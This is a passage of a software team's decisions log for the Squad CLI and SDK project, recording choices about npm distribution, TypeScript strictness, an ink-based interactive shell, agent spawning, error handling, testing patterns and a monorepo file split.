# Decisions

> Team decisions that all agents must respect. Managed by Scribe.

### 2026-02-21: SDK distribution stays on GitHub
**By:** Keaton (carried from beta)
**What:** Distribution is `npx github:bradygaster/squad` — never move to npmjs.com.
**Why:** GitHub-native distribution aligns with the Copilot ecosystem. No registry dependency.

### 2026-02-21: v1 docs are internal only
**By:** Keaton (carried from beta)
**What:** No published docs site for v1. Documentation is team-facing only.
**Why:** Ship the runtime first. Public docs come later when the API surface stabilizes.

### 2026-02-21: Type safety — strict mode non-negotiable
**By:** Edie (carried from beta)
**What:** `strict: true`, `noUncheckedIndexedAccess: true`, no `@ts-ignore` allowed.
**Why:** Types are contracts. If it compiles, it works. Strict mode catches entire categories of bugs.

### 2026-02-21: Hook-based governance over prompt instructions
**By:** Baer (carried from beta)
**What:** Security, PII, and file-write guards are implemented via the hooks module, NOT prompt instructions.
**Why:** Prompts can be ignored or overridden. Hooks are code — they execute deterministically.

### 2026-02-21: Node.js ≥20, ESM-only, streaming-first
**By:** Fortier (carried from beta)
**What:** Runtime target is Node.js 20+. ESM-only (no CJS shims, no dual-package hazards). Async iterators over buffers.
**Why:** Modern Node.js features enable cleaner async patterns. ESM-only eliminates CJS interop complexity.

### 2026-02-21: Casting — The Usual Suspects, permanent
**By:** Squad Coordinator (carried from beta)
**What:** Team names drawn from The Usual Suspects (1995). Scribe is always Scribe. Ralph is always Ralph. Names persist across repos and replatforms.
**Why:** Names are team identity. The team rebuilt Squad beta with these names.

### 2026-02-21: Proposal-first workflow
**By:** Keaton (carried from beta)
**What:** Meaningful changes require a proposal in `docs/proposals/` before execution.
**Why:** Proposals create alignment before code is written. Cheaper to change a doc than refactor code.

### 2026-02-21: Tone ceiling — always enforced
**By:** McManus (carried from beta)
**What:** No hype, no hand-waving, no claims without citations. Every public-facing statement must be substantiated.
**Why:** Trust is earned through accuracy, not enthusiasm.

### 2026-02-21: Zero-dependency scaffolding preserved
**By:** Rabin (carried from beta)
**What:** CLI remains thin (`cli.js`), runtime stays modular. Zero runtime dependencies for the CLI scaffolding path.
**Why:** Users should be able to run `npx` without downloading a dependency tree.

### 2026-02-21: Merge driver for append-only files
**By:** Kobayashi (carried from beta)
**What:** `.gitattributes` uses `merge=union` for `.squad/decisions.md`, `agents/*/history.md`, `log/**`, `orchestration-log/**`.
**Why:** Enables conflict-free merging of team state across branches. Both sides only append content.

### 2026-02-21T20:25:35Z: User directive — Interactive Shell as Primary UX
**By:** Brady (via Copilot)
**What:** Squad becomes its own interactive CLI shell. `squad` with no args enters a REPL where users talk directly to the team. Copilot SDK is the LLM backend — Squad shells out to it for completions, not the other way around.
**Why:** Copilot CLI has usability issues (unreliable agent handoffs, no visibility into background work). Squad needs to own the full interactive experience with real-time status and direct coordination UX.
**How:** Terminal UI with `ink` (React for CLIs), SDK session management with streaming, direct agent spawning (one session per agent). This becomes Wave 0 (foundation).
**Decisions needed:** Terminal UI library (ink vs. blessed), streaming (event-driven vs. polling), session lifecycle (per-agent vs. pool), background cleanup (explicit vs. timeout).

### 2026-02-21T21:22:47Z: User directive — rename `squad watch` to `squad triage`
**By:** Brady (via Copilot)
**What:** "squad watch" should be renamed to "squad triage" — user feedback that the command name should reflect active categorization/routing, not passive observation.
**Why:** User request — captured for team memory.

### 2026-02-21T21:35:22Z: User directive — CLI command naming: `squad loop`
**By:** Brady (via Copilot)
**What:** The work monitor CLI command should be `squad loop`, not `squad ralph` or `squad monitor`. "Loop" is universally understood — no Squad lore needed. Finalized preference (supersedes Keaton's recommendations in favor of `squad monitor`). Update issue #269 accordingly.
**Why:** User request — final naming decision. Brady prefers `squad loop` for clarity and universal understanding.

### 2026-02-21T21:35:22Z: User directive — `squad hire` CLI command
**By:** Brady (via Copilot)
**What:** Add a `squad hire` CLI command. This is the team creation entry point — the init experience with personality. "squad hire" instead of "squad init".
**Why:** User request — Brady wants CLI commands that feel natural and match Squad's identity.

### 2026-02-21: CLI rename — `watch` → `triage` (recommended) (consolidated)
**By:** Keaton (Lead)
**What:** Rename `squad watch` to `squad triage`. Keep `watch` as silent alias for backward compatibility. Explicitly recommend against `squad ralph` as a CLI command. Suggest `squad monitor` or `squad loop` instead to describe the persistent monitoring function.
**Why:** "Triage" is 40% more semantically accurate (matches GitHub's own terminology and incident-management patterns). "Ralph" is internal lore — opaque to new users and violates CLI UX conventions (all user-facing commands are action verbs or domain nouns). `squad monitor` is self-describing and professional.
**Details:** Change is low-risk. Silent alias prevents breakage. Confidence 85% for triage rename, 90% confidence Ralph shouldn't be user-facing.
**Reference:** Keaton analysis in `.squad/decisions/inbox/keaton-cli-rename.md`

### 2026-02-21: SDK M0 blocker — upgrade from `file:` to npm reference (resolved)
**By:** Kujan (SDK Expert), Edie (implementation)
**What:** Change `optionalDependencies` from `file:../copilot-sdk/nodejs` to `"@github/copilot-sdk": "^0.1.25"`. The SDK is published on npm (28 versions, SLSA attestations). This one-line change unblocks npm publish and removes CI dependency on sibling directory.
**Why:** The `file:` reference is the only M0 blocker. Squad's SDK surface is minimal (1 runtime import: `CopilotClient`). Keep SDK in `optionalDependencies` to preserve zero-dependency scaffolding guarantee (Rabin decision).
**Verified:** Build passes (0 errors), all 1592 tests pass with npm reference. No tests require live Copilot CLI server. PR #271 merged successfully.
**Reference:** Kujan audit + Edie implementation in `.squad/decisions/inbox/edie-sdk-swap.md`
**Closes:** #190, #193, #194

### 2026-02-21T21:35:22Z: User directive — no temp/memory files in repo root
**By:** Brady (via Copilot)
**What:** NEVER write temp files, issue files, or memory files to the repo root. All squad state/scratch files belong in .squad/ and ONLY .squad/. Root tree of a user's repo is sacred — don't clutter it.
**Why:** User request — hard rule. Captured for all agents.

### 2026-02-21: npm workspace protocol for monorepo
**By:** Edie (TypeScript Engineer)
**Date:** 2026-02-21
**PR:** #274
**What:** Use npm-native workspace resolution (version-string references like `"0.6.0-alpha.0"`) instead of `workspace:*` protocol for cross-package dependencies.
**Why:** The `workspace:*` protocol is pnpm/Yarn-specific. npm workspaces resolve workspace packages automatically by matching the package name in the `workspaces` glob — a version-string reference is all that's needed. Using npm-native semantics avoids toolchain lock-in and keeps the monorepo compatible with stock npm.
**Impact:** All future inter-package dependencies in `packages/*/package.json` should use the actual version string, not `workspace:*`.

### 2026-02-21: Resolution module placement and API separation
**By:** Fenster (Core Dev)
**Date:** 2026-02-21
**Re:** #210, #211
**What:**
- `resolveSquad()` and `resolveGlobalSquadPath()` live in `src/resolution.ts` at the repo root, not in `packages/squad-sdk/`.
- The two functions are independent — `resolveSquad()` does NOT automatically fall back to `resolveGlobalSquadPath()`.
**Why:**
1. **Placement:** Code hasn't migrated to the monorepo packages yet. Putting it in `packages/squad-sdk/src/` would create a split that doesn't match the current build pipeline (`tsc` compiles `src/` to `dist/`). When the monorepo migration happens, `src/resolution.ts` moves with everything else.
2. **Separation of concerns:** Issue #210 says "repo squad always wins over personal squad" — that's a *policy* decision for the consumer, not for the resolution primitives. Keeping the two functions independent lets CLI/runtime compose them however needed (e.g., try repo first, fall back to global, or merge both).
**Impact:** Low. When packages split happens, move `src/resolution.ts` into `packages/squad-sdk/src/`. The public API shape stays the same.

### 2026-02-21: Changesets setup — independent versioning for squad-sdk and squad-cli
**By:** Kobayashi (Git & Release)
**Date:** 2026-02-21
**Re:** #208
**What:** Installed and configured @changesets/cli v2 for independent package versioning across the monorepo.
**Configuration:**
- `access`: `"public"` (both packages will be published)
- `baseBranch`: `"main"` (release branch for changesets)
- `fixed`: `[]` (empty — no linked releases)
- `linked`: `[]` (empty — no linked releases)
- `updateInternalDependencies`: `"patch"` (default, appropriate for SDK→CLI dependency)
**Why:** Squad is a monorepo with two distinct packages (squad-sdk and squad-cli) with different release cadences and audiences. Independent versioning prevents unnecessary releases and version inflation when only one package changes.
**Implementation:** `.changeset/config.json` created, npm script `changeset:check` added to `package.json` for CI validation.
**Next Steps:** Contributors use `npx changeset add` before merge; release workflow runs `changeset publish` to GitHub.

### 2026-02-21: --global flag and status command pattern
**By:** Fenster (Core Dev)
**Date:** 2026-02-21
**Re:** #212, #213
**What:**
- `--global` flag on `init` and `upgrade` routes to `resolveGlobalSquadPath()` instead of `process.cwd()`.
- `squad status` composes both `resolveSquad()` and `resolveGlobalSquadPath()` to show which squad is active and why.
- All routing logic stays in `src/index.ts` main() — init.ts and upgrade.ts are path-agnostic (they take a `dest` string).
**Why:**
1. **Thin CLI contract:** init and upgrade already accept a destination directory. The `--global` flag is a CLI concern, not a runtime concern — so it lives in the CLI routing layer only.
2. **Composition over fallback:** `squad status` demonstrates the intended consumer pattern from #210/#211: try repo resolution first, then check global path. The resolution primitives stay independent.
3. **Debugging UX:** Status shows repo resolution, global path, and global squad existence — all the info needed to debug "why isn't my squad loading?" issues.
**Impact:** Low. Single-file change to `src/index.ts`. No changes to resolution algorithms or init/upgrade internals.

### 2026-02-21: No repo root clutter — ensureSquadPath() guard
**By:** Fenster (Core Dev)
**Date:** 2026-02-21
**Re:** #273

**What:**
- Added `ensureSquadPath(filePath, squadRoot)` in `src/resolution.ts` — a guard that validates a target path is inside `.squad/` or the system temp directory before any write occurs. Throws with a descriptive error if the path is outside both.
- Exported from the public API (`src/index.ts`).

**Why:**
Brady's hard rule: ALL squad scratch/temp/state files MUST go in `.squad/` only. During issue creation, 20+ temp files were written directly to the repo root. This guard provides a single validation function that any file-writing code path can call to enforce the policy deterministically (per the hooks-over-prompts decision).

**Audit findings:**
- 30+ file write calls across `src/` — most already write into `.squad/` subdirectories or user-requested destinations.
- The `tools/index.ts` write_file tool and `cli/commands/export.ts` write to user-specified paths (intentional, user-requested).
- No existing code paths were changed — this is a new guard utility for future enforcement.

**Impact:** Low. Additive-only change. Existing behavior unchanged. Future code that writes temp/scratch files should call `ensureSquadPath()` before writing.

### 2026-02-21: CLI routing logic is testable via composition, not process spawning
**By:** Hockney (Tester)
**Date:** 2026-02-21
**Re:** #214

**What:** Integration tests for `squad status` and `--global` flag test the *routing logic* (the conditional expressions from `main()`) directly, rather than spawning a child process and parsing stdout.

**Why:**
1. `main()` in `src/index.ts` calls `process.exit()` and is not exported — spawning would be flaky and slow.
2. The routing logic is simple conditionals over `resolveSquad()` and `resolveGlobalSquadPath()` — testing those compositions directly is deterministic and fast.
3. If `main()` is ever refactored to export a testable function, these tests can be upgraded — the assertions stay the same.

**Impact:** Low. Sets a pattern for future CLI integration tests: test the logic, not the process.

### 2026-02-21: Ink + React dependency versions
**By:** Edie (TypeScript Engineer)
**Date:** 2026-02-21
**Re:** #233
**PR:** #281

**What:**
- **ink@6.8.0** — latest stable, ESM-native, no CJS shims required
- **react@19.2.4** — required by ink 6.x (peer dependency); React 19 is ESM-friendly
- **ink-testing-library@4.0.0** — matches ink 6.x major version pairing
- **@types/react@19.2.14** — TypeScript types for React 19

**Why:** ink 6.x + React 19 are fully ESM-native — aligns with our ESM-only policy. ink-testing-library enables unit-testing ink components without a real terminal. All added as root-level deps for now; can be scoped to `packages/squad-cli` during monorepo migration.

**Impact:** Low. No source changes — dependency additions only. Build passes (tsc strict), all 1621 tests pass.

### 2026-02-21: GitHub-native distribution deprecated in favor of npm
**By:** Fenster (Core Dev)
**Date:** 2026-02-21
**Re:** #219

**What:**
- Root `cli.js` now prints a deprecation warning to stderr when invoked via `npx github:bradygaster/squad`.
- Users are directed to `npm install -g @bradygaster/squad-cli` or `npx @bradygaster/squad-cli`.
- The warning is non-blocking — existing behavior continues after the notice.

**Why:** The `@bradygaster/squad-cli` and `@bradygaster/squad-sdk` packages are now published to npm. The GitHub-native distribution (`npx github:bradygaster/squad`) was the original entry point but is now superseded. This deprecation notice gives users a migration path before the GitHub-native entry point is eventually removed.

**Supersedes:** The earlier "SDK distribution stays on GitHub" decision (Keaton, carried from beta). npm is now the primary distribution channel.

**Impact:** Low. Additive-only change to the bundled `cli.js`. No behavior change — just a stderr warning.

### 2026-02-21: Shell chrome patterns and session registry design
**By:** Fenster (Core Dev)
**Date:** 2026-02-21
**Re:** #236, #237

**Shell Chrome:** The interactive shell header uses box-drawing characters (`╭╰│─`) for visual chrome. Version is read from `package.json` at runtime via `createRequire(import.meta.url)` — no hardcoded version strings. Box-drawing chrome is universally supported in modern terminals and provides clear visual framing without external dependencies. Using `createRequire` for JSON import follows the existing pattern in `src/build/github-dist.ts` and avoids ESM JSON import assertions.

**Exit handling:** Three exit paths — `exit` command, `/quit` command, and Ctrl+C (SIGINT). All produce the same cleanup message ("👋 Squad out.") for consistency.

**Session Registry:** `SessionRegistry` is a simple Map-backed class with no persistence, no event emitting, and no external dependencies. It tracks agent sessions by name with status lifecycle: `idle` → `working` → `streaming` → `idle`/`error`. Designed as a pure state container that the ink UI will consume. The Map-based approach allows O(1) lookup by agent name, which is the primary access pattern for status display.

**Impact:** Low. Two files changed. No API surface changes outside the shell module. SessionRegistry is exported for future consumption but has no current consumers.

### 2026-02-21: TSX compilation enabled in root tsconfig
**By:** Fenster (Core Dev)
**Date:** 2026-02-21
**Re:** #242, #243, #244

**What:** Added `"jsx": "react-jsx"` to the root `tsconfig.json` to enable TSX compilation for ink-based React components in `src/cli/shell/components/`.

**Why:** The shell UI uses ink (React for CLIs), which requires JSX support. `react-jsx` is the modern transform — no need to import React in every file for JSX (though we do for explicitness). This is a project-wide setting because all TSX files live under `src/` which is the root `rootDir`.

**Components created:**
- `AgentPanel.tsx` — agent status display (consumes `AgentSession` from `types.ts`)
- `MessageStream.tsx` — streaming message output (consumes `ShellMessage` from `types.ts`)
- `InputPrompt.tsx` — readline input with history navigation
- `components/index.ts` — barrel export

All components are pure presentational — no SDK calls, no side effects. State management is the responsibility of the shell orchestrator.

**Impact:** Low. Only affects `.tsx` files. No existing `.ts` files are impacted. The setting is compatible with strict mode and NodeNext module resolution.

### 2026-02-21: Shell module structure and entry point routing
**By:** Fenster (Core Dev)
**Date:** 2026-02-21
**Re:** #234, #235
**PR:** #282

**What:**
- `src/cli/shell/` module created with `index.ts`, `types.ts`, and `components/` placeholder directory.
- `squad` with no args now launches `runShell()` (interactive shell) instead of `runInit()`.
- `squad init` remains available as an explicit subcommand — no functionality removed.

**Why:**
1. **Entry point change:** Brady's directive makes the interactive shell the primary UX. Running `squad` with no args should enter the shell, not re-run init. Init is still available via `squad init`.
2. **Placeholder over premature implementation:** `runShell()` is console.log-only. Ink dependency is handled separately (#233). This keeps the shell module structure ready without coupling to the UI library.
3. **Types first:** `ShellState`, `ShellMessage`, and `AgentSession` interfaces define the shell's data model before any UI code exists. This lets other agents (ink wiring, agent spawning) code against stable types.

**Impact:** Low. No existing tests broken (1621/1621 pass). The only behavior change is `squad` (no args) prints a shell header and exits instead of running init. `squad init` and `squad --help` / `squad help` continue to work as before.

### 2026-02-21: Agent spawn infrastructure pattern
**By:** Fenster (Core Dev)
**Date:** 2026-02-21
**Re:** #238

**What:** Created `src/cli/shell/spawn.ts` with three exported functions:
- `loadAgentCharter(name, teamRoot?)` — filesystem charter loading via `resolveSquad()`
- `buildAgentPrompt(charter, options?)` — system prompt construction from charter + context
- `spawnAgent(name, task, registry, options?)` — full spawn lifecycle with SessionRegistry integration

SDK session creation (CopilotClient) is intentionally stubbed. The spawn infrastructure is complete; session wiring comes when we understand the SDK's session management API.

**Why:**
1. **Separation of concerns:** Charter loading, prompt building, and session lifecycle are independent functions. This lets stream bridge and coordinator reuse `buildAgentPrompt` and `spawnAgent` without coupling.
2. **Testability:** `teamRoot` parameter on `loadAgentCharter` allows tests to point at a fixture directory without mocking `resolveSquad()`.
3. **Stub-first:** Rather than guessing the CopilotClient session API shape, we built the surrounding infrastructure. The TODO is a single integration point — when the SDK surface is clear, the change is surgical.

**Impact:** Low. Additive-only. No existing behavior changed. Two files modified: `spawn.ts` (new), `index.ts` (barrel exports added).

### 2026-02-21: Session lifecycle owns team discovery
**By:** Fortier (Node.js Runtime)
**Date:** 2026-02-21
**Re:** #240

**What:** `ShellLifecycle.initialize()` is the single entry point for team discovery in the interactive shell. It reads `.squad/team.md`, parses the Members table, and registers active agents in `SessionRegistry`. No other shell component should independently parse `team.md` or discover agents.

**Why:**
1. **Single responsibility:** Team discovery is a lifecycle concern — it happens once at shell startup. Scattering `team.md` parsing across components would create divergent interpretations of the manifest format.
2. **Testability:** By owning initialization, `ShellLifecycle` can be tested with a mock filesystem (or temp `.squad/` directory) without touching the registry or renderer.
3. **State consistency:** The lifecycle class is the source of truth for shell state. If initialization fails (missing `.squad/`, missing `team.md`), the state transitions to `error` and downstream components can check `getState().status` rather than catching exceptions everywhere.

**Impact:** Low. Additive-only. Future shell features (command routing, agent spawning) should call `lifecycle.getDiscoveredAgents()` instead of re-parsing `team.md`.

### 2026-02-21: StreamBridge is an event sink, not a subscriber
**By:** Fortier (Node.js Runtime)
**Date:** 2026-02-21
**Re:** #239

**What:** `StreamBridge` receives `StreamingEvent` objects via `handleEvent()` but does not register itself with `StreamingPipeline`. The wiring (`pipeline.onDelta(e => bridge.handleEvent(e))`) is the caller's responsibility.

**Why:**
1. **Testability:** The bridge can be tested with plain event objects — no pipeline instance needed.
2. **Flexibility:** The shell entry point controls which events reach the bridge (e.g., filtering by session, throttling for UI frame rate).
3. **Single responsibility:** The bridge translates events to callbacks; it doesn't manage subscriptions or lifecycle.

**Impact:** Low. Pattern applies to all future bridges between the pipeline and UI layers (ink components, web sockets, etc.).

### 2026-02-21: Shell module test patterns — fixtures over mocks
**By:** Hockney (Tester)
**Date:** 2026-02-21
**Re:** #248

**What:** Shell module tests use `test-fixtures/.squad/` with real files (team.md, routing.md, agent charters) instead of mocking fs calls. The `loadAgentCharter` and `buildCoordinatorPrompt` functions accept a `teamRoot` parameter that enables this pattern.

**Why:**
1. Real file reads catch encoding issues, path resolution bugs, and parsing edge cases that mocks hide.
2. The `teamRoot` parameter was already designed into the API — tests should use it.
3. StreamBridge tests use callback spies (arrays capturing calls) rather than vi.fn() — simpler to assert on and read.

**Impact:** Low. Establishes fixture patterns for future shell module tests. test-fixtures/.squad/ is now a shared test resource.

### 2026-02-21: Branch protection configuration
**By:** Kobayashi (Git & Release)
**Date:** 2026-02-21
**Re:** #209

**Main Branch Protection:** Require PR + passing build status checks. All changes to main require a PR (not direct push). PR cannot be merged until `build` check passes (CI/CD gate). Zero approving reviews required — allows team to use PR merge buttons freely (no blocking review workflow needed). Admins not exempted (same rules apply to everyone, strengthens process integrity).

**Insider Branch:** No protection — allows direct pushes. Insider releases are automation-driven; direct branch push is the automation's path.

**Implementation:** Used GitHub API (REST v3): `PUT /repos/{owner}/{repo}/branches/main/protection` with required_status_checks + required_pull_request_reviews. `DELETE /repos/{owner}/{repo}/branches/insider/protection` confirmed no-op (no existing rule).

**Note:** Status check context name is `"build"` — must match the exact check name from CI workflow. If CI workflow renames the check, branch protection must be updated to match.

### 2026-02-21: Insider publish package scaffolds
**By:** Kobayashi (Git & Release)
**Date:** 2026-02-21
**Re:** #215
**PR:** #283

**What:** Added minimal publishable entry points to `packages/squad-sdk/` and `packages/squad-cli/` so the insider publish workflow can produce valid npm packages.

**squad-sdk:**
- `src/index.ts`: exports `VERSION` constant (placeholder — full source migration comes later)
- `tsconfig.json`: extends root, outputs to `dist/` with declarations
- `package.json`: added `files`, `scripts.build`

**squad-cli:**
- `src/cli.ts`: placeholder binary (`#!/usr/bin/env node`)
- `tsconfig.json`: extends root, outputs to `dist/` with declarations
- `package.json`: added `files`, `scripts.build`; `bin` already pointed to `./dist/cli.js`

**Root:** `build` script updated: `tsc && npm run build --workspaces --if-present`

**Why:** The insider publish pipeline triggers on push to `insider` branch but both workspace packages were empty scaffolds — no source, no build output, nothing to publish. This adds the minimum viable content so `npm publish` succeeds and the insider channel can be verified end-to-end.

**Constraints respected:** ESM-only, TypeScript strict mode, Node.js >=20, squad-cli depends on squad-sdk via version string, `files` lists ensure only `dist/` and `README.md` ship in the published package.

**Impact:** Low. Does not migrate real source code — these are placeholders. Does not add tests for workspace packages (nothing to test yet).

### 2026-02-21: Distribution moves to npm for production
**By:** Rabin (Distribution)
**Date:** 2026-02-21
**Re:** #216

**What:** Squad packages (`@bradygaster/squad-sdk` and `@bradygaster/squad-cli`) are now distributed via npmjs.com. This supersedes the beta-era decision "Distribution is `npx github:bradygaster/squad` — never move to npmjs.com."

**Why:** The project has matured from beta to production. npm is the standard distribution channel for Node.js packages. The insider publish (`0.6.0-alpha.0`) validated the pipeline. Production publish (`0.6.0`) is the natural next step.

**Workflow:** Tag push `v*` on `main` triggers `.github/workflows/squad-publish.yml`. Auth is CI-only via `setup-node` + `NODE_AUTH_TOKEN`. No root `.npmrc` needed. No `--provenance` (private repo limitation).

**Impact:** Users install via `npm install @bradygaster/squad-cli` (or `npx @bradygaster/squad-cli`). The GitHub-native `npx github:bradygaster/squad` path may still work but is no longer the primary distribution channel.

### 2026-02-21: Coordinator prompt structure — three routing modes
**By:** Verbal (Prompt Engineer)
**Date:** 2026-02-21
**Re:** #241

**What:** The coordinator system prompt (`buildCoordinatorPrompt()`) uses a structured response format with three routing modes:
- `DIRECT:` — coordinator answers inline, no agent spawn
- `ROUTE:` + `TASK:` + `CONTEXT:` — single agent delegation
- `MULTI:` with bullet list — fan-out to multiple agents

The parser (`parseCoordinatorResponse()`) extracts a `RoutingDecision` from the LLM response. Unrecognized formats fall back to `DIRECT` (safe default — never silently drops input).

**Why:**
1. **Structured output over free-form:** Keyword prefixes (`ROUTE:`, `DIRECT:`, `MULTI:`) are cheap to parse and reliable across model temperatures. No JSON parsing needed.
2. **Fallback-to-direct:** If the LLM doesn't follow the format, the response is surfaced to the user rather than lost. This prevents silent failures in the routing layer.
3. **Prompt composition from files:** team.md and routing.md are read at prompt-build time, not baked in. This means the coordinator adapts to team changes without code changes.

**Impact:** Low. Additive module. No changes to existing shell behavior. Future work will wire this into the readline loop and SDK session.
### 2026-02-21: CRLF normalization — single utility, applied at parser entry points
**By:** Fenster (Core Dev)
**Re:** #220, #221 (Epic #181)

**What:**
- Created `src/utils/normalize-eol.ts` exporting `normalizeEol(content: string): string` — replaces `\r\n` and `\r` with `\n`.
- Applied as the first line of 8 parser functions across 6 files: markdown-migration.ts (3 parsers), routing.ts, charter-compiler.ts, skill-loader.ts, agent-doc.ts, doc-sync.ts.

**Why:**
On Windows with `core.autocrlf=true`, file reads return `\r\n` line endings. Every parser that calls `.split('\n')` would leave stray `\r` characters in parsed values — breaking regex matches, table parsing, and string comparisons. Normalizing at the parser entry point is the minimal defensive guard: one line per function, no behavioral change on LF-only systems.

**Pattern:**
Always normalize at the *entry* of the parsing function, not at the file-read callsite. This ensures parsers are self-contained and safe regardless of how content arrives (file read, API response, test fixture).

**Impact:**
Low. Additive-only. No test changes needed. Existing tests pass because test strings are already LF-only. The guard is transparent for LF inputs.

### 2026-02-21: CLI entry point split — src/index.ts is a pure barrel
**By:** Edie (TypeScript Engineer)
**Re:** #187

**What:**
- `src/index.ts` is now a pure re-export barrel with ZERO side effects. No `main()`, no `process.exit()`, no argument parsing.
- `src/cli-entry.ts` contains the full `main()` function and all CLI routing logic.
- `VERSION` is exported from `index.ts` (public API constant); `cli-entry.ts` imports it.
- `SquadError` is now explicitly exported from the barrel.

**Why:**
Anyone importing `@bradygaster/squad` as a library (e.g., SquadUI) was triggering CLI argument parsing and `process.exit()` on import. This poisoned the library entry point. The split makes `dist/index.js` safe for library consumption while `dist/cli-entry.js` remains the CLI binary.

**Impact:**
Low. Two files changed. Build passes (tsc strict), all 1683 tests pass. No changes to package.json `bin` or `main`.

**Future:**
When source migrates to `packages/squad-cli/`, the CLI entry point moves with it. The barrel (`packages/squad-sdk/src/index.ts`) stays side-effect-free.

### 2026-02-21: Process.exit() refactor — library-safe CLI functions
**By:** Kujan (SDK Expert)
**Re:** #189

**What:**
- `fatal()` now throws `SquadError` instead of calling `process.exit(1)`.
- `src/index.ts` is a pure barrel export with zero side effects (no `main()`, no `process.exit()`).
- `src/cli-entry.ts` is the sole CLI entry point — it catches `SquadError` and calls `process.exit(1)`.
- `runWatch()` resolves its Promise on SIGINT/SIGTERM instead of `process.exit(0)`.
- `runShell()` closes readline on SIGINT instead of `process.exit(0)`.
- `SquadError` class is exported from the public API.

**Why:**
SquadUI (VS Code extension) imports CLI functions as a library. `process.exit()` kills the entire VS Code extension host. All library-consumable functions must throw errors or return results, never call `process.exit()`. Only the CLI entry point (the thin presentation layer) may call `process.exit()`.

**Pattern established:**
- Library functions: throw `SquadError` or return result objects
- CLI entry point: catches errors, formats output, calls `process.exit()`
- Library consumers: catch `SquadError` for structured error handling

**Impact:**
Medium. Changes error handling contract for all functions that used `fatal()`. Backwards-compatible for CLI users (same behavior). Library consumers now get catchable errors instead of process termination.

### 2026-02-21: User directive — docs as you go
**By:** bradygaster (via Copilot)
**What:** Doc and blog as you go during SquadUI integration work. Doesn't have to be perfect — a proper docs pass comes later — but keep docs updated incrementally.
**Why:** User request — captured for team memory

### 2026-02-23: Aspire Dashboard Scenario Documentation
**By:** Saul (Aspire & Observability)
**Date:** 2026-02-23
**Status:** COMPLETED

### 2026-02-23: Make sendAndWait timeout configurable
**Author:** Cheritto (TUI Engineer)
**Date:** 2026-02-23
**Status:** Implemented
**Issue:** #325
**PR:** #347

Added `TIMEOUTS.SESSION_RESPONSE_MS` to `packages/squad-sdk/src/runtime/constants.ts` — default 600,000ms (10 minutes), overridable via `SQUAD_SESSION_TIMEOUT_MS` env var. Updated `packages/squad-cli/src/cli/shell/index.ts` to use the constant instead of hard-coded 120,000ms timeout. All 41 streaming tests pass. Users can now set `SQUAD_SESSION_TIMEOUT_MS=900000` for 15-minute timeouts.

### 2026-02-23: E2E Test Coverage Expansion
**By:** Breedan (E2E Test Engineer)
**Date:** 2026-02-23
**Status:** Accepted
**PR:** #348 (closes #326)

Added 14 new Gherkin scenarios across 6 new feature files, bringing total to 21 acceptance scenarios + 6 UX gate tests (27 total). New harness capabilities: `cwd` option on `spawnWithArgs()`, absolute path resolution, `mkdtempSync` temp dir creation, negative assertion step. Coverage areas: init-command, status-extended, doctor-extended, help-comprehensive, error-paths, exit-codes.

### 2026-02-23: Hostile QA Bug Catalog — Issue #327
**By:** Waingro
**Date:** 2026-02-23
**Status:** Reported — awaiting triage

Found 2 P1/P2 bugs: (1) `--version` output omits "squad" prefix (P1, location: packages/squad-cli/src/cli-entry.ts:48), (2) Empty/whitespace args launch interactive shell in non-TTY (P2, location: packages/squad-cli/src/cli-entry.ts:102). Added 32 hostile QA Gherkin scenarios across 7 feature files and 80+ adversarial string corpus. All corrupt config scenarios handled gracefully; unicode edge cases pass cleanly.

### 2026-02-23: Accessibility Audit — Squad CLI
**By:** Nate (Accessibility Reviewer)
**Date:** 2026-02-23
**Issue:** #328 — Accessibility Audit
**Verdict:** CONDITIONAL PASS

Summary: 2 passes (Keyboard Navigation ✅, Help Text ✅), 2 failures (Color Contrast & NO_COLOR ❌, Error Guidance ❌). Priority fixes: (1) P1 — Respect `NO_COLOR` in terminal.ts and gate ANSI codes in output.ts. (2) P1 — Add remediation hints to missing team.md error (lifecycle.ts) and charter-not-found error (spawn.ts). Nice-to-have: P2 Wire Tab autocomplete, add remediation to SDK-not-connected errors; P3 Add Escape key, include keyboard shortcuts in /help output.

**What:** Created `docs/scenarios/aspire-dashboard.md` — a single, focused scenario doc for using Squad with the Aspire dashboard. Covers what Aspire is, how to launch it via Docker, how to connect Squad SDK to it, what traces/metrics appear in the UI, troubleshooting, and pro tips. Updated `docs/build.js` to include the new scenario in the explicit ordering (added to SECTION_ORDER for scenarios).

**Tone:** Action-oriented, welcoming, prompt-first — matches existing Squad docs (see `solo-dev.md` for reference style).

**Key Sections:**
1. What Is Aspire (standalone OTel dashboard, not .NET-specific)
2. Launch the container (docker run command + squad aspire convenience)
3. Connect Squad to Aspire (CLI env var + SDK programmatic)
4. Dashboard content (traces, metrics, resources with concrete examples)
5. Example workflow (start, run, observe)
6. Troubleshooting (no traces, slow dashboard, connection refused)
7. Pro tips (metric export frequency, custom service names, batch sizing)

**Implementation Details:** Reviewed `packages/squad-sdk/src/runtime/otel-*.ts` and `test/aspire-integration.test.ts` for accurate coverage of OTel integration. Aspire ports (18888 UI, 4317 OTLP gRPC), UNSECURED_ALLOW_ANONYMOUS mode, and gRPC-only protocol constraints all documented accurately.

**Verification:** Docs build verified — `npm run docs:build` generates 39 pages with `aspire-dashboard.html` correctly included in scenarios nav. Navigation in all scenario pages (e.g., solo-dev.html) correctly links to the new scenario.

**Why:** Brady requested a "try it now" guide for Aspire integration — single doc that covers launch AND connection, written for immediate action. This replaces scattered documentation and provides a clean entry point for developers wanting to observe Squad telemetry in real time.

### 2026-02-22T035939Z: Repository scope directive
**By:** Brady (via Copilot)
**What:** Do NOT change anything in bradygaster/squad repo. This working copy is bradygaster/squad-pr — changes are permitted here. The two repos are distinct.
**Why:** User request — captured for team memory

### 2026-02-22: SDK/CLI File Split Plan — Definitive Mapping
**By:** Keaton (Lead)
**Status:** Decision
**Scope:** Monorepo restructure — move `src/` into `packages/squad-sdk/` and `packages/squad-cli/`

**Overview:** All 114 `.ts` files in root `src/` must be split between two workspace packages. The dependency direction is **one-way: CLI → SDK**. No SDK module imports from CLI. This is clean and the split is mechanical.

**SDK Package (`packages/squad-sdk/src/`):**
- **Directories:** adapter, agents, build, casting, client, config, coordinator, hooks, marketplace, ralph, runtime, sharing, skills, tools, utils (15 total)
- **Standalone files:** index.ts, resolution.ts, parsers.ts, types.ts
- **Exports:** Expanded to 18 subpath exports matching directory structure
- **Dependencies:** `@github/copilot-sdk` only (zero UI deps)

**CLI Package (`packages/squad-cli/src/`):**
- **Directories:** cli/ (all CLI submodules: core/, commands/, shell/, components/)
- **Standalone files:** cli-entry.ts (becomes `bin.squad` target)
- **Dependencies:** `@bradygaster/squad-sdk`, ink, react, esbuild

**Root Package:**
